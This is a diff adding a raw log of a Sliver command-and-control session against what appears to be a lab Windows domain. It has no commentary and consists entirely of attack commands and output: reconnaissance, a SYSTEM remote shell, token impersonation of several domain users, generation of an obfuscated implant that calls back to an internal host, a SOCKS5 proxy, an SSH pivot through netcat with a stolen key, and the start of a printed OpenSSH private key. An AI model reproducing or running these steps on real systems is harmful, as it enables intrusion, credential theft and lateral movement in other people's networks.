@@ -1,0 +1,879 @@
+sa-whoami
+
+[*] Successfully executed sa-whoami (coff-loader)
+[*] Got output:
+
+UserName		SID
+====================== ====================================
+SHIRE\PTook	S-1-5-21-3221313398-3958442956-3063574122-1115
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+SHIRE\Domain Users                                Group                    S-1-5-21-3221313398-3958442956-3063574122-513 Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+SHIRE\Corp Admins                                 Group                    S-1-5-21-3221313398-3958442956-3063574122-1114 Mandatory group, Enabled by default, Enabled group, 
+SHIRE\Employees                                   Group                    S-1-5-21-3221313398-3958442956-3063574122-1112 Mandatory group, Enabled by default, Enabled group, 
+Authentication authority asserted identity        Well-known group         S-1-18-1                                      Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
+
+
+objectClass: top, person, organizationalPerson, user, computer
+cn: CORP-DC
+distinguishedName: CN=CORP-DC,OU=Domain Controllers,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725220833.0Z
+whenChanged: 20230725221908.0Z
+uSNCreated: 12293
+uSNChanged: 12840
+name: CORP-DC
+objectGUID: fb0534a1-5cdf-45ca-99b2-1117381f17a2
+userAccountControl: 532480
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348837314209784
+localPolicyFlags: 0
+pwdLastSet: 133347965300517772
+primaryGroupID: 516
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1008
+accountExpires: 9223372036854775807
+logonCount: 17
+sAMAccountName: CORP-DC$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+serverReferenceBL: CN=CORP-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=shire,DC=lab
+dNSHostName: Corp-DC.shire.lab
+rIDSetReferences: CN=RID Set,CN=CORP-DC,OU=Domain Controllers,DC=shire,DC=lab
+servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/Corp-DC.shire.lab, ldap/Corp-DC.shire.lab/DomainDnsZones.shire.lab, ldap/Corp-DC.shire.lab/ForestDnsZones.shire.lab, TERMSRV/CORP-DC, TERMSRV/Corp-DC.shire.lab, DNS/Corp-DC.shire.lab, GC/Corp-DC.shire.lab/shire.lab, RestrictedKrbHost/Corp-DC.shire.lab, RestrictedKrbHost/CORP-DC, RPC/8549c67e-cf32-40eb-88bf-de0597bc832f._msdcs.shire.lab, HOST/CORP-DC/SHIRE, HOST/Corp-DC.shire.lab/SHIRE, HOST/CORP-DC, HOST/Corp-DC.shire.lab, HOST/Corp-DC.shire.lab/shire.lab, E3514235-4B06-11D1-AB04-00C04FC2DCD2/8549c67e-cf32-40eb-88bf-de0597bc832f/shire.lab, ldap/CORP-DC/SHIRE, ldap/8549c67e-cf32-40eb-88bf-de0597bc832f._msdcs.shire.lab, ldap/Corp-DC.shire.lab/SHIRE, ldap/CORP-DC, ldap/Corp-DC.shire.lab, ldap/Corp-DC.shire.lab/shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20230725220833.0Z, 16010101000001.0Z
+lastLogonTimestamp: 133347965533280878
+msDS-SupportedEncryptionTypes: 28
+msDS-GenerationId: ?['??B
+msDFSR-ComputerReferenceBL: CN=CORP-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=shire,DC=lab
+--------------------
+objectClass: top, person, organizationalPerson, user, computer
+cn: CORP-WKS2
+distinguishedName: CN=CORP-WKS2,OU=CORP,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725222939.0Z
+whenChanged: 20230725223011.0Z
+uSNCreated: 16426
+uSNChanged: 16469
+name: CORP-WKS2
+objectGUID: 8bb047d8-031c-47cc-9c9c-a48588c03602
+userAccountControl: 4096
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348923347952326
+localPolicyFlags: 0
+pwdLastSet: 133347977792467080
+primaryGroupID: 515
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1120
+accountExpires: 9223372036854775807
+logonCount: 22
+sAMAccountName: CORP-WKS2$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+dNSHostName: CORP-WKS2.shire.lab
+servicePrincipalName: WSMAN/CORP-WKS2, WSMAN/CORP-WKS2.shire.lab, TERMSRV/CORP-WKS2, TERMSRV/CORP-WKS2.shire.lab, RestrictedKrbHost/CORP-WKS2, HOST/CORP-WKS2, RestrictedKrbHost/CORP-WKS2.shire.lab, HOST/CORP-WKS2.shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133347977795129501
+msDS-SupportedEncryptionTypes: 28
+--------------------
+objectClass: top, person, organizationalPerson, user, computer
+cn: CORP-WKS1
+distinguishedName: CN=CORP-WKS1,OU=CORP,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725222939.0Z
+whenChanged: 20230725223011.0Z
+uSNCreated: 16429
+uSNChanged: 16468
+name: CORP-WKS1
+objectGUID: e1e695de-ef4a-4642-9e56-94ead4e543f8
+userAccountControl: 4096
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348923340609313
+localPolicyFlags: 0
+pwdLastSet: 133347977792937081
+primaryGroupID: 515
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1121
+accountExpires: 9223372036854775807
+logonCount: 21
+sAMAccountName: CORP-WKS1$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+dNSHostName: CORP-WKS1.shire.lab
+servicePrincipalName: WSMAN/CORP-WKS1, WSMAN/CORP-WKS1.shire.lab, TERMSRV/CORP-WKS1, TERMSRV/CORP-WKS1.shire.lab, RestrictedKrbHost/CORP-WKS1, HOST/CORP-WKS1, RestrictedKrbHost/CORP-WKS1.shire.lab, HOST/CORP-WKS1.shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133347977795599768
+msDS-SupportedEncryptionTypes: 28
+--------------------
+objectClass: top, person, organizationalPerson, user, computer
+cn: CORP-WKS0
+distinguishedName: CN=CORP-WKS0,OU=CORP,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725222939.0Z
+whenChanged: 20230725223018.0Z
+uSNCreated: 16434
+uSNChanged: 16481
+name: CORP-WKS0
+objectGUID: 424070c6-beb6-4e9c-8771-3ae652ca0421
+userAccountControl: 4096
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348918332533997
+localPolicyFlags: 0
+pwdLastSet: 133347977793563811
+primaryGroupID: 515
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1122
+accountExpires: 9223372036854775807
+logonCount: 19
+sAMAccountName: CORP-WKS0$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+dNSHostName: CORP-WKS0.shire.lab
+servicePrincipalName: WSMAN/CORP-WKS0, WSMAN/CORP-WKS0.shire.lab, TERMSRV/CORP-WKS0, TERMSRV/CORP-WKS0.shire.lab, RestrictedKrbHost/CORP-WKS0, HOST/CORP-WKS0, RestrictedKrbHost/CORP-WKS0.shire.lab, HOST/CORP-WKS0.shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133347977796539868
+msDS-SupportedEncryptionTypes: 28
+--------------------
+objectClass: top, person, organizationalPerson, user, computer
+cn: DEV-WKS0
+distinguishedName: CN=DEV-WKS0,OU=DEV,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725223717.0Z
+whenChanged: 20230725223812.0Z
+uSNCreated: 16572
+uSNChanged: 16613
+name: DEV-WKS0
+objectGUID: 7cc066e4-c23c-42ce-88bd-0313fe318068
+userAccountControl: 4096
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348918214644032
+localPolicyFlags: 0
+pwdLastSet: 133347982373129854
+primaryGroupID: 515
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1123
+accountExpires: 9223372036854775807
+logonCount: 20
+sAMAccountName: DEV-WKS0$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+dNSHostName: DEV-WKS0.shire.lab
+servicePrincipalName: WSMAN/DEV-WKS0, WSMAN/DEV-WKS0.shire.lab, TERMSRV/DEV-WKS0, TERMSRV/DEV-WKS0.shire.lab, RestrictedKrbHost/DEV-WKS0, HOST/DEV-WKS0, RestrictedKrbHost/DEV-WKS0.shire.lab, HOST/DEV-WKS0.shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133347982375786367
+msDS-SupportedEncryptionTypes: 28
+--------------------
+objectClass: top, person, organizationalPerson, user, computer
+cn: DEV-WKS1
+distinguishedName: CN=DEV-WKS1,OU=DEV,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725223717.0Z
+whenChanged: 20230725223747.0Z
+uSNCreated: 16575
+uSNChanged: 16599
+name: DEV-WKS1
+objectGUID: 7f526608-0d4e-4a36-9b9f-947d2b785a15
+userAccountControl: 4096
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348918216206185
+localPolicyFlags: 0
+pwdLastSet: 133347982373598643
+primaryGroupID: 515
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1124
+accountExpires: 9223372036854775807
+logonCount: 22
+sAMAccountName: DEV-WKS1$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+dNSHostName: DEV-WKS1.shire.lab
+servicePrincipalName: WSMAN/DEV-WKS1, WSMAN/DEV-WKS1.shire.lab, TERMSRV/DEV-WKS1, TERMSRV/DEV-WKS1.shire.lab, RestrictedKrbHost/DEV-WKS1, HOST/DEV-WKS1, RestrictedKrbHost/DEV-WKS1.shire.lab, HOST/DEV-WKS1.shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133347982376255482
+msDS-SupportedEncryptionTypes: 28
+retreived 6 results total
+
+
+sa-ldapsearch (&(ObjectClass=Computer)(samaccountname=*dc*))
+
+[*] Successfully executed sa-ldapsearch (coff-loader)
+[*] Got output:
+Binding to 10.3.1.100[*] Distinguished name: DC=shire,DC=lab
+[*] targeting DC: \\Corp-DC.shire.lab
+[*] Filter: (&(ObjectClass=Computer)(samaccountname=*dc*))
+
+--------------------
+objectClass: top, person, organizationalPerson, user, computer
+cn: CORP-DC
+distinguishedName: CN=CORP-DC,OU=Domain Controllers,DC=shire,DC=lab
+instanceType: 4
+whenCreated: 20230725220833.0Z
+whenChanged: 20230725221908.0Z
+uSNCreated: 12293
+uSNChanged: 12840
+name: CORP-DC
+objectGUID: fb0534a1-5cdf-45ca-99b2-1117381f17a2
+userAccountControl: 532480
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 133348837314209784
+localPolicyFlags: 0
+pwdLastSet: 133347965300517772
+primaryGroupID: 516
+objectSid: S-1-5-21-3221313398-3958442956-3063574122-1008
+accountExpires: 9223372036854775807
+logonCount: 17
+sAMAccountName: CORP-DC$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+serverReferenceBL: CN=CORP-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=shire,DC=lab
+dNSHostName: Corp-DC.shire.lab
+rIDSetReferences: CN=RID Set,CN=CORP-DC,OU=Domain Controllers,DC=shire,DC=lab
+servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/Corp-DC.shire.lab, ldap/Corp-DC.shire.lab/DomainDnsZones.shire.lab, ldap/Corp-DC.shire.lab/ForestDnsZones.shire.lab, TERMSRV/CORP-DC, TERMSRV/Corp-DC.shire.lab, DNS/Corp-DC.shire.lab, GC/Corp-DC.shire.lab/shire.lab, RestrictedKrbHost/Corp-DC.shire.lab, RestrictedKrbHost/CORP-DC, RPC/8549c67e-cf32-40eb-88bf-de0597bc832f._msdcs.shire.lab, HOST/CORP-DC/SHIRE, HOST/Corp-DC.shire.lab/SHIRE, HOST/CORP-DC, HOST/Corp-DC.shire.lab, HOST/Corp-DC.shire.lab/shire.lab, E3514235-4B06-11D1-AB04-00C04FC2DCD2/8549c67e-cf32-40eb-88bf-de0597bc832f/shire.lab, ldap/CORP-DC/SHIRE, ldap/8549c67e-cf32-40eb-88bf-de0597bc832f._msdcs.shire.lab, ldap/Corp-DC.shire.lab/SHIRE, ldap/CORP-DC, ldap/Corp-DC.shire.lab, ldap/Corp-DC.shire.lab/shire.lab
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=shire,DC=lab
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20230725220833.0Z, 16010101000001.0Z
+lastLogonTimestamp: 133347965533280878
+msDS-SupportedEncryptionTypes: 28
+msDS-GenerationId: ?['??B
+msDFSR-ComputerReferenceBL: CN=CORP-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=shire,DC=lab
+retreived 1 results total
+
+
+sa-ipconfig
+
+[*] Successfully executed sa-ipconfig (coff-loader)
+[*] Got output:
+{609007E8-31C5-4687-B07B-F4F3DEFD9FAD}
+	Ethernet
+	Amazon Elastic Network Adapter
+	0E-1A-52-A6-EF-0D
+	10.1.1.101
+Hostname: 	CORP-WKS0
+DNS Suffix: 	shire.lab
+DNS Server: 	10.3.1.100
+
+sa-arp
+
+[*] Successfully executed sa-arp (coff-loader)
+[*] Got output:
+
+Inteface  --- 0x1
+Internet Address        Physical Address        Type                    
+224.0.0.22                                      static                  
+239.255.255.250                                 static                  
+
+Inteface  --- 0x5
+Internet Address        Physical Address        Type                    
+10.1.1.1                0E-83-0E-4F-D5-B7       dynamic                 
+10.1.1.102              0E-21-9A-CD-4E-9F       dynamic                 
+10.1.1.103              0E-A4-32-7F-57-2B       dynamic                 
+10.1.1.255              FF-FF-FF-FF-FF-FF       static                  
+224.0.0.22              01-00-5E-00-00-16       static                  
+224.0.0.251             01-00-5E-00-00-FB       static                  
+224.0.0.252             01-00-5E-00-00-FC       static                  
+239.255.255.250         01-00-5E-7F-FF-FA       static                  
+255.255.255.255         FF-FF-FF-FF-FF-FF       static     
+
+
+shell
+
+? This action is bad OPSEC, are you an adult? Yes
+
+[*] Wait approximately 10 seconds after exit, and press <enter> to continue
+[*] Opening shell tunnel (EOF to exit) ...
+
+[*] Started remote shell with pid 1096
+
+PS C:\> net localgroup
+net localgroup
+
+Aliases for \\CORP-WKS0
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Print Operators
+*RDS Endpoint Servers
+*RDS Management Servers
+*RDS Remote Access Servers
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*Storage Replica Administrators
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+PS C:\> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 3:
+
+   Connection-specific DNS Suffix  . : ec2.internal
+   Link-local IPv6 Address . . . . . : fe80::b79a:7b7e:c7be:c77b%5
+   IPv4 Address. . . . . . . . . . . : 10.1.1.101
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.1.1.1
+
+
+
+
+sa-ipconfig
+
+[*] Successfully executed sa-ipconfig (coff-loader)
+[*] Got output:
+{F8C01C8A-CF62-4E25-9682-F19649025C84}
+	Ethernet
+	Amazon Elastic Network Adapter
+	0E-A4-32-7F-57-2B
+	10.1.1.103
+Hostname: 	CORP-WKS2
+DNS Suffix: 	shire.lab
+DNS Server: 	10.3.1.100
+
+
+sliver (guilty_spark) > sa-get-netsession
+
+[*] Successfully executed sa-get-netsession (coff-loader)
+[*] Got output:
+
+Total of 0 entries enumerated
+
+
+sliver (guilty_spark) > ls
+
+C:\Users (8 items, 174 B)
+=========================
+drwxrwxrwx  Administrator                     <dir>  Tue Jul 25 17:47:58 +0000 2023
+Lrw-rw-rw-  All Users -> C:\ProgramData       0 B    Sat Sep 15 07:28:48 +0000 2018
+drwxrwxrwx  corpadmin                         <dir>  Tue Jul 25 22:44:57 +0000 2023
+dr-xr-xr-x  Default                           <dir>  Tue Jul 25 17:46:16 +0000 2023
+Lrw-rw-rw-  Default User -> C:\Users\Default  0 B    Sat Sep 15 07:28:48 +0000 2018
+-rw-rw-rw-  desktop.ini                       174 B  Sat Sep 15 07:16:48 +0000 2018
+drwxrwxrwx  GOlorin                           <dir>  Tue Jul 25 22:31:34 +0000 2023
+dr-xr-xr-x  Public                            <dir>  Wed Dec 12 07:45:15 +0000 2018
+
+
+sliver (guilty_spark) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: NT AUTHORITY\SYSTEM
+sliver (guilty_spark) > ps
+
+ Pid    Ppid   Owner                          Arch     Executable                Session 
+====== ====== ============================== ======== ========================= =========
+ 0      0                                              [System Process]          -1      
+ 4      0                                     x86_64   System                    0       
+ 84     4                                     x86_64   Registry                  0       
+ 264    4                                     x86_64   smss.exe                  0       
+ 360    352                                   x86_64   csrss.exe                 0       
+ 436    352                                   x86_64   wininit.exe               0       
+ 444    428                                   x86_64   csrss.exe                 1       
+ 504    428    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe              1       
+ 572    436                                   x86_64   services.exe              0       
+ 580    436    NT AUTHORITY\SYSTEM            x86_64   lsass.exe                 0       
+ 696    572    NT AUTHORITY\SYSTEM            x86_64   svchost.exe               0       
+ 724    436    Font Driver Host\UMFD-0        x86_64   fontdrvhost.exe           0       
+ 728    504    Font Driver Host\UMFD-1        x86_64   fontdrvhost.exe           1       
+ 812    572    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe               0       
+ 944    504    Window Manager\DWM-1           x86_64   dwm.exe                   1       
+ 980    572    NT AUTHORITY\SYSTEM            x86_64   svchost.exe               0       
+ 988    572    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe               0       
+ 320    572    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe               0       
+ 384    572    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe               0       
+ 352    572    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe               0       
+ 1036   572    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe               0       
+ 1044   572    NT AUTHORITY\SYSTEM            x86_64   svchost.exe               0       
+ 1116   572    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe               0       
+ 1320   572    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe               0       
+ 1644   572    NT AUTHORITY\SYSTEM            x86_64   svchost.exe               0       
+ 1652   572    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe               0       
+ 1828   572    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe               0       
+ 1964   572    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe               0       
+ 1520   572    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe      0       
+ 2128   572    NT AUTHORITY\SYSTEM            x86_64   svchost.exe               0       
+ 2412   1520   NT AUTHORITY\SYSTEM            x86_64   ssm-agent-worker.exe      0       
+ 2420   2412   NT AUTHORITY\SYSTEM            x86_64   conhost.exe               0       
+ 2168   572    NT AUTHORITY\SYSTEM            x86_64   svchost.exe               0       
+ 2632   980    SHIRE\GOlorin                  x86_64   sihost.exe                1       
+ 2620   572    SHIRE\GOlorin                  x86_64   svchost.exe               1       
+ 2908   980    SHIRE\GOlorin                  x86_64   taskhostw.exe             1       
+ 1492   1044   SHIRE\GOlorin                  x86_64   ctfmon.exe                1       
+ 3192   3160   SHIRE\GOlorin                  x86_64   explorer.exe              1       
+ 3612   696    SHIRE\GOlorin                  x86_64   ShellExperienceHost.exe   1       
+ 3720   696    SHIRE\GOlorin                  x86_64   SearchUI.exe              1       
+ 3884   696    SHIRE\GOlorin                  x86_64   RuntimeBroker.exe         1       
+ 3980   696    SHIRE\GOlorin                  x86_64   RuntimeBroker.exe         1       
+ 2732   572    NT AUTHORITY\NETWORK SERVICE   x86_64   msdtc.exe                 0       
+ 1148   572    NT AUTHORITY\SYSTEM            x86_64   readwrite.exe             0       
+ 2116   696    SHIRE\GOlorin                  x86_64   RuntimeBroker.exe         1       
+ 1456   572    NT AUTHORITY\SYSTEM            x86_64   kj____s.exe               0       
+
+
+sliver (guilty_spark) > impersonate SHIRE\GOlorin
+
+[!] rpc error: code = Unknown desc = Could not acquire a token belonging to SHIREGOlorin
+sliver (guilty_spark) > impersonate SHIRE/GOlorin
+
+[!] rpc error: code = Unknown desc = Could not acquire a token belonging to SHIRE/GOlorin
+sliver (guilty_spark) > impersonate GOlorin
+
+[!] rpc error: code = Unknown desc = Could not acquire a token belonging to GOlorin
+sliver (guilty_spark) > impersonate SHIRE\\GOlorin
+
+[*] Successfully impersonated SHIRE\GOlorin
+
+sliver (guilty_spark) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: SHIRE\GOlorin
+
+
+impersonate MBrandybuck
+
+[!] rpc error: code = Unknown desc = Could not acquire a token belonging to MBrandybuck
+sliver (vmexplore) > impersonate SHIRE\\MBrandybuck
+
+[*] Successfully impersonated SHIRE\MBrandybuck
+
+sliver (vmexplore) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: SHIRE\MBrandybuck
+
+
+
+generate -f service -N contx -i 10.1.1.101:9898
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m22s
+[*] Implant saved to /home/user2/contx.exe
+
+
+impersonate SHIRE\\FBaggins
+
+[*] Successfully impersonated SHIRE\FBaggins
+
+sliver (guilty_spark) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: SHIRE\FBaggins
+
+
+
+socks5 start
+
+[*] Started SOCKS5 127.0.0.1 1081  
+⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
+
+
+sudo ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1081 %h %p' FBaggins@10.3.1.200 -i .ssh/rivendell_id_ecdsa1.pub
+The authenticity of host '10.3.1.200 (<no hostip for proxy command>)' can't be established.
+ED25519 key fingerprint is SHA256:v7KQEQk2iRhy/U1Msypwh3ZaSpGhvKv8xIyxaSg6cP8.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.3.1.200' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jul 29 02:25:12 UTC 2023
+
+  System load:  0.0               Processes:             109
+  Usage of /:   28.1% of 7.57GB   Users logged in:       1
+  Memory usage: 24%               IPv4 address for ens5: 10.3.1.200
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jul 29 01:40:05 2023 from 10.2.1.101
+FBaggins@Rivendell:~$ ls
+
+
+ cat known_hosts
+|1|oUamLPWxTnaGTtIO+AZHHvoNYyU=|ts2272SFw5Oz8bpPuhrOndeTibU= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO7oPM4zG0sGKCoznAue2G4mHlPgfWL4uaQztObahmXp
+|1|l1efF11aMstBN6YffLOF7Z9VZUw=|ULdphh28HHYboNoYmZPkNs4rFGM= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+/oPaJUjsXsHdDY1MuXREy6wZ5kmBAE4kn/9YQUBh4F1FHrlZxsHzuHvQrIUBC5Ryo6HlSnODQaaC6SH5Zkg4K+ENRz2yZ6/Mjuc+HfyWJL+rmKo1dqvsn3aWWCJ9dQt7ULwDtunNEZvDNRHmqQsCXPQRSg4jlnw6FJaMt+FMIwc4xuB4lSM8hha/fwKBwTfNK349CsWcHoYGmQgNUPn12K0GknuZk/8xZW64V4Z2yxbhdWmPRAyuCqZ5nB2U60yE5RSLNW692ORXUhciMCSFfAeJHagiYdv6gs+Z5kf17oJcUhJudXO6pAQe1WjOD6Q5TNOQNTIRvpw8rkYF3gr9eoqNEnpkQAi8jjOiwNBAtg+/Ik83UKbtVfA9culKCxMCcFB2Az4wzVxJguOOtq14hTtUl0vkKJ9ABy9boXXcqgQP75r4aaEchkWxnCkOQLYF6+SWcu6xOdtRkGxzKEI/d6eaCzvAtTLPA2EQWiLAu5dUN2PJ5xlmBSN/wfh8klk=
+|1|OVvxuKiXRtv/V4zwE72iBkfDEhQ=|6Bw8B3cFTq0KhSggn5xSjeXg4EQ= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEQyRkKuQGeq4/IyluCR2z6Lr825S4DyL2fDiBqH4W1uEebySOPsL8uyiEUwx+55F9pDffCCd3S1E7euBmd00yU=
+
+
+cat authorized_keys 
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJoD+Fc/9j3mhCDOPmAwV7//vB88+Jl9wYxGsGNQjUcr3kvVobFvDlZP1WMM8nZ5ZhLygRIpR49El8aVb6hJMqw=
+
+
+cd ssh
+FBaggins@Rivendell:/etc/ssh$ ls
+moduli                ssh_host_ecdsa_key        ssh_host_rsa_key.pub
+ssh_config            ssh_host_ecdsa_key.pub    ssh_import_id
+ssh_config.d          ssh_host_ed25519_key      sshd_config
+ssh_host_dsa_key      ssh_host_ed25519_key.pub  sshd_config.d
+ssh_host_dsa_key.pub  ssh_host_rsa_key
+
+
+portfwd add -b 127.0.0.1:2022 -r 10.3.1.200:22
+
+[*] Port forwarding 127.0.0.1:2022 -> 10.3.1.200:22
+
+sliver (guilty_spark) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: SHIRE\FBaggins
+
+
+
+ cd .ssh
+
+[*] C:\Users\FBaggins\.ssh
+
+sliver (guilty_spark) > ls
+
+C:\Users\FBaggins\.ssh (2 items, 654 B)
+=======================================
+-rw-rw-rw-  rivendell_id_ecdsa1      492 B  Tue Jul 25 22:44:55 +0000 2023
+-rw-rw-rw-  rivendell_id_ecdsa1.pub  162 B  Tue Jul 25 22:44:54 +0000 2023
+
+
+sliver (guilty_spark) > cat rivendell_id_ecdsa1
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
+1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQSaA/hXP/Y95oQgzj5gMFe//7wfPPiZ
+fcGMRrBjUI1HK95L1aGxbw5WT9VjDPJ2eWYS8oESKUePRJfGlW+oSTKsAAAAoHc/WQ53P1
